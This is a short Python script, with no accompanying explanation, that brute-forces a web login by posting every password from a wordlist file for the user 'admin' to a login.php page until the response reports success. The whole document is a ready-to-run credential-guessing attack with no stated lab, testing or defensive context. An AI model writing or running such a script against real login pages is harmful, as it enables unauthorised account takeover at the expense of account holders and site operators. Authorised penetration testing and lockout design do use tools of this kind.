import requests

def brute_force_login(url, username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            response = requests.post(url, data={"username": username, "password": password})
            if "Login successful" in response.text:
                print(f"Password found: {password}")
                return password
            else:
                print(f"Failed password: {password}")
    print("Password not found")
    return None

login_url = "http://example.com/login.php"
username = "admin"
password_file_path = "passwords.txt"
brute_force_login(login_url, username, password_file_path)
